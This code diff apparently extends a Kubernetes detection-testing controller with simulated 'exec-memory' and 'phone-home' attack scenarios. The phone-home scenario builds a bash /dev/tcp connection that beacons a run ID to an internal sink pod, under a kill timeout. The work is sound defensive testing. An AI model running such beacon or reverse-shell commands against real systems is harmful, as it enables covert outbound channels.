@@ -44,6 +44,8 @@ ALLOWED_SCENARIOS = frozenset(
     {
         "audit-evasion",
         "discovery",
+        "exec-memory",
+        "phone-home",
         "reverse-shell",
         "shell-history",
         "decoy-modify",
@@ -129,8 +131,14 @@ class ScenarioController:
                 return pod.status.pod_ip
         raise RuntimeError("scenario sink pod has no IP")
 
-    def _exec(self, command: list[str]) -> str:
-        pod_name = self._workload_pod_name()
+    def _exec(
+        self,
+        command: list[str],
+        *,
+        check: bool = False,
+        pod_name: str | None = None,
+    ) -> str:
+        pod_name = pod_name or self._workload_pod_name()
         resp = stream(
             self.core.connect_get_namespaced_pod_exec,
             pod_name,
@@ -150,6 +158,11 @@ class ScenarioController:
             if resp.peek_stderr():
                 output += resp.read_stderr()
         resp.close()
+        if check and resp.returncode != 0:
+            raise RuntimeError(
+                f"scenario exec did not complete successfully "
+                f"(exit={resp.returncode}): {output.strip()}"
+            )
         if resp.returncode not in (0, None):
             logger.warning("exec returned %s: %s", resp.returncode, output)
         return output
@@ -228,6 +241,28 @@ class ScenarioController:
 
     def _script_for(self, scenario_id: str, sink_ip: str, marker: str) -> list[str]:
         port = str(self.settings.sink_port)
+        if scenario_id == "exec-memory":
+            inner = f"exec -a {shlex.quote(marker)} python3 /scripts/exec-memory.py"
+            return [
+                "/bin/bash",
+                "-lc",
+                f"timeout -s KILL 52 bash -c {shlex.quote(inner)}",
+            ]
+        if scenario_id == "phone-home":
+            run_id = marker.rsplit("-", 1)[-1]
+            inner = (
+                "set -e; "
+                f"exec 3<>/dev/tcp/{sink_ip}/{port}; "
+                f"printf '%s\\n' {shlex.quote(run_id)} >&3; "
+                "sleep 20; "
+                "exec 3>&-"
+            )
+            marked_bash = f"exec -a {shlex.quote(marker)} bash -c {shlex.quote(inner)}"
+            return [
+                "/bin/bash",
+                "-lc",
+                f"timeout -s KILL 27 bash -c {shlex.quote(marked_bash)}",
+            ]
         if scenario_id == "discovery":
             inner = (
                 "(exec -a argus-gtc-discovery-uname bash -c 'uname -a; sleep 2'); "
@@ -284,8 +319,13 @@ class ScenarioController:
             try:
                 sink_ip = (
                     self._sink_ip()
-                    if scenario_id in {"reverse-shell", "network-burst"}
+                    if scenario_id in {"reverse-shell", "network-burst", "phone-home"}
                     else ""
+                )
+                workload_pod_name = (
+                    self._workload_pod_name()
+                    if scenario_id in {"exec-memory", "phone-home"}
+                    else None
                 )
                 if scenario_id == "audit-evasion":
                     command, stdin_text = self._audit_evasion_execution(marker)
@@ -296,7 +336,9 @@ class ScenarioController:
                     )
                 else:
                     output = self._exec(
-                        self._script_for(scenario_id, sink_ip, marker)
+                        self._script_for(scenario_id, sink_ip, marker),
+                        check=scenario_id in {"exec-memory", "phone-home"},
+                        pod_name=workload_pod_name,
                     )
                 return ScenarioResult(
                     scenario_id=scenario_id,
@@ -306,6 +348,8 @@ class ScenarioController:
                     or SCENARIO_LABELS.get(scenario_id, scenario_id),
                     started_at=started,
                     scenario_marker=marker,
+                    target_pod=workload_pod_name,
+                    target_ip=sink_ip or None,
                 )
             finally:
                 self._last_scenario = scenario_id
